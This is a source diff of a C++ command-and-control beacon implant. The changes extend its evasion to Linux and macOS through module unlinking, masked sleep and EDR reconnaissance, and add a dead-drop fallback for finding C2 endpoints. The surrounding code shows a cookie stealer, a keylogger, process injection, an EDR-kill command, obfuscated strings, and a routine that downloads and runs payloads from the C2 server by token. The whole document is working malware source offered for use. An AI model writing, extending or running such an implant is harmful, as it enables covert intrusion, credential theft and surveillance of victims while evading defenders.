@@ -4,7 +4,7 @@
 //  Beacon loop: check-in → receive tasks → execute → send results → sleep.
 //
 //  Build (Windows - MinGW-w64):
-//    x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -o beacon.exe main.cpp syscalls.o \
+//    x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -o beacon.exe main.cpp syscalls.o
 //        -lwinhttp -lbcrypt -lws2_32 -lbthprops -lwlanapi -liphlpapi -lcrypt32 -static
 //
 //  Build (Windows - MSVC):
@@ -71,13 +71,16 @@
 #include "netstat.h"
 #include "cookie_stealer.h"
 #include "cdp_pivot.h"
-#ifdef _WIN32
+// sleep_mask.h and peb_unlink.h are self-guarded and now carry POSIX
+// implementations too (masked sleep / link_map unlink), so include them on
+// every platform.
 #include "sleep_mask.h"
+#include "peb_unlink.h"
+#ifdef _WIN32
 #include "sleep_ekko.h"
 #include "stack_spoof.h"
 #include "smb.h"
 #include "apc_injection.h"
-#include "peb_unlink.h"
 #endif
 #include "wlan_scan.h"
 #include "bt_scan.h"
@@ -347,7 +350,11 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         o << "etw_ti=" << (rep.etw_ti_alive ? "assumed-alive" : "no") << "\n";
         return o.str();
 #else
-        return "edrcheck: windows only\n";
+        // POSIX: same situational awareness as Windows (LSM / eBPF / audit /
+        // known agents on Linux; SIP / system extensions on macOS).
+        edrcheck::EdrReport rep;
+        edrcheck::report(rep);
+        return edrcheck::format(rep);
 #endif
     }
     if (action == XOR_DEC(XOR_STR("edr-kill")).c_str()) {
@@ -822,15 +829,15 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
 #ifdef _WIN32
         std::string url = std::string(r_ssl ? "https" : "http") + "://" +
                           r_host + ":" + std::to_string(r_port) +
-                          "/api/v1/remote_payload_windows?auth=" + C2_PAYLOAD_TOKEN;
+                          "/api/v1/remote_payload_windows?auth=" + crypto::payload_token();
 #elif defined(__ANDROID__) || defined(ANDROID)
         std::string url = std::string(r_ssl ? "https" : "http") + "://" +
                           r_host + ":" + std::to_string(r_port) +
-                          "/api/v1/remote_payload_android?auth=" + C2_PAYLOAD_TOKEN;
+                          "/api/v1/remote_payload_android?auth=" + crypto::payload_token();
 #else
         std::string url = std::string(r_ssl ? "https" : "http") + "://" +
                           r_host + ":" + std::to_string(r_port) +
-                          "/api/v1/remote_payload_linux?auth=" + C2_PAYLOAD_TOKEN;
+                          "/api/v1/remote_payload_linux?auth=" + crypto::payload_token();
 #endif
         std::string bin = net::http_request(cfg, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
             std::wstring(url.begin(), url.end()).c_str(), "", "");
@@ -1069,6 +1076,11 @@ extern "C" void beacon_main(int argc, char** argv) {
     #endif
 #else
     srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
+    #ifndef DISABLE_ANTI
+    // POSIX PEB-equivalent: drop our module from the loader's link_map
+    // (Linux); on macOS the dyld image list is read-only, so it is a no-op.
+    peb_unlink::hide_module();
+    #endif
 #endif
 
     net::C2Config cfg;
@@ -1089,8 +1101,10 @@ extern "C" void beacon_main(int argc, char** argv) {
     // Endpoint ladder + proxy posture from the build config: a single
     // compiled-in host dies with the first filtered address, and a beacon
     // that ignores the system proxy never calls home from a managed network.
-    cfg.seed_ladder(C2_HOST, C2_HOSTS);
+    cfg.seed_ladder(C2_HOST, C2_HOSTS, C2_HOST_PINS, C2_HOST_PUBKEY_PINS);
     cfg.proxy = C2_PROXY;
+    // LAST RING: consulted only after the whole ladder keeps failing
+    cfg.dead_drop = C2_DEADDROP;
 
     if (argc >= 2) {
         std::string host_str(argv[1]);
@@ -1137,7 +1151,6 @@ extern "C" void beacon_main(int argc, char** argv) {
     unsigned long checkins_ok = 0, checkins_fail = 0, tasks_done = 0;
     unsigned long results_pending_peak = 0;
     unsigned long long uptime_start = (unsigned long long)time(nullptr);
-    unsigned long long last_cfg_update = 0;
     std::string last_error;
 
     // mirror into the globals the `health` command reads
@@ -1147,6 +1160,19 @@ extern "C" void beacon_main(int argc, char** argv) {
         std::string telemetry = std::string(XOR_DEC(XOR_STR("{\"build_id\":\"")).c_str()) + BUILD_ID +
                     XOR_DEC(XOR_STR("\",\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) +
                     XOR_DEC(XOR_STR("\"}")).c_str();
+
+#if C2_DEADDROP_BOOTSTRAP
+        // DEAD-DROP-FIRST: resolve the live endpoint ONCE, before the very
+        // first check-in, so the compiled address is only a fallback rung.
+        // A failure is a plain no-op — the compiled ladder takes over and
+        // the ordinary last-ring path retries after `dd_after` failures.
+        if (!cfg.dd_bootstrap_done) {
+            cfg.dd_bootstrap_done = true;
+            if (!cfg.dead_drop.empty() && net::refresh_from_dead_drop(cfg)) {
+                cfg.dd_failures = 0;
+            }
+        }
+#endif
 
         std::string response = net::checkin(cfg, telemetry);
 
@@ -1250,6 +1276,18 @@ extern "C" void beacon_main(int argc, char** argv) {
                 net::g_ctx.cleanup();
 #endif
             }
+            // LAST RING: when the ladder keeps failing, consult the dead drop
+            // for a fresh endpoint. Its own counter bounds the cost: a dead
+            // drop that is ALSO unreachable costs one request per window, not
+            // one per check-in.
+            if (!cfg.dead_drop.empty() && ++cfg.dd_failures >= cfg.dd_after) {
+                cfg.dd_failures = 0;
+                if (net::refresh_from_dead_drop(cfg)) {
+                    last_error += " -> dead-drop endpoint " + cfg.endpoint();
+                    cfg.sleep_ms = cfg.base_sleep_ms;
+                    consecutive_failures = 1;
+                }
+            }
             g_last_error = last_error;
             if (consecutive_failures > 1) {
                 cfg.sleep_ms = std::min(60000, cfg.sleep_ms * 2);
@@ -1270,9 +1308,14 @@ extern "C" void beacon_main(int argc, char** argv) {
         Sleep(jitter_sleep);
         #endif
 #else
-        // Linux/macOS: plain sleep (no EDR to evade); keylogger runs in
-        // its own thread.
+        // Linux/macOS: masked sleep (RC4 over the idle stack region), the
+        // POSIX counterpart of the Windows Ekko path; keylogger runs in its
+        // own thread.
+        #ifndef DISABLE_ANTI
+        ekko::ekko_sleep_masked(jitter_sleep);
+        #else
         Sleep(jitter_sleep);
+        #endif
 #endif
         keylogger::poll();
     }
@@ -1290,9 +1333,6 @@ extern "C" void beacon_main(int argc, char** argv) {
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     if (injection::self_hollow())
         return 0;
-
-    int argc = 0;
-    char** argv = nullptr;
 
     std::vector<std::string> args;
     args.push_back("beacon.exe");
